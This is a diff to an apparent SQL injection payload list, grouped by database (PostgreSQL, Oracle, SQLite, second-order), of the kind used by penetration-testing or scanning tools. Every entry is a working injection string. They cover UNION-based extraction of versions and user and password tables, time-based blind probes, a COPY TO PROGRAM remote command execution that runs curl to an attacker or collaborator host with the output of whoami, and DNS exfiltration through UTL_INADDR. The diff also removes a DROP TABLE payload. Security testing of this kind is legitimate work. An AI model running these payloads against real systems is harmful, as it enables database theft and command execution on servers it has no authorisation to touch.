@@ -28,7 +28,7 @@
         {"payload": "1' UNION SELECT NULL,version(),NULL--", "description": "UNION version extraction", "waf_bypass": false},
         {"payload": "1'; SELECT pg_sleep(5)--", "description": "Stacked query with pg_sleep", "waf_bypass": false},
         {"payload": "1' AND 1=CAST((SELECT version()) AS int)--", "description": "CAST error-based extraction", "waf_bypass": false},
-        {"payload": "1'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/$(whoami)'--", "description": "COPY TO PROGRAM RCE (superuser required)", "waf_bypass": false},
+        {"payload": "1'; COPY (SELECT '') TO PROGRAM 'curl http://COLLABORATOR_URL/$(whoami)'--", "description": "COPY TO PROGRAM RCE (superuser required) — exfil via Collaborator", "waf_bypass": false},
         {"payload": "1' AND 1=(SELECT 1 FROM pg_sleep(5))--", "description": "Subquery pg_sleep", "waf_bypass": false},
         {"payload": "1'; SELECT $1$alert$1$--", "description": "Dollar-quote injection probe", "waf_bypass": false},
         {"payload": "1' UNION SELECT NULL,current_database(),NULL--", "description": "Current database name", "waf_bypass": false},
@@ -96,7 +96,7 @@
         {"payload": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", "description": "Time-based blind via DBMS_PIPE.RECEIVE_MESSAGE", "waf_bypass": false},
         {"payload": "' || (SELECT banner FROM v$version WHERE ROWNUM=1) || '", "description": "String concat version extraction via v$version", "waf_bypass": false},
         {"payload": "' UNION SELECT username,password,NULL FROM all_users--", "description": "UNION SELECT user enumeration from all_users", "waf_bypass": false},
-        {"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))='x", "description": "Out-of-band DNS exfiltration via UTL_INADDR", "waf_bypass": false}
+        {"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.COLLABORATOR_URL')='x", "description": "Out-of-band DNS exfiltration via UTL_INADDR — appends current_user to Collaborator subdomain", "waf_bypass": false}
       ]
     },
     "sqlite": {
@@ -117,7 +117,7 @@
         {"payload": "test' UNION SELECT 1--", "description": "UNION SELECT stored for second-order execution", "waf_bypass": false},
         {"payload": "admin'/*", "description": "Username with block comment for stored injection", "waf_bypass": false},
         {"payload": "admin' AND 1=1--", "description": "Username registration with boolean SQLi — triggers on profile display or admin dashboard query", "waf_bypass": false},
-        {"payload": "test'); DROP TABLE tokens;--", "description": "Destructive second-order via profile field — executes when value is used in unparameterized INSERT/UPDATE", "waf_bypass": false},
+        {"payload": "test'); SELECT version();--", "description": "Stacked second-order probe — executes when value is used in unparameterized INSERT/UPDATE; reveals version on error/log", "waf_bypass": false},
         {"payload": "user@evil.com' UNION SELECT password FROM users WHERE '1'='1", "description": "Email field stored injection — triggers when email is used in later notification or export query", "waf_bypass": false}
       ]
     },
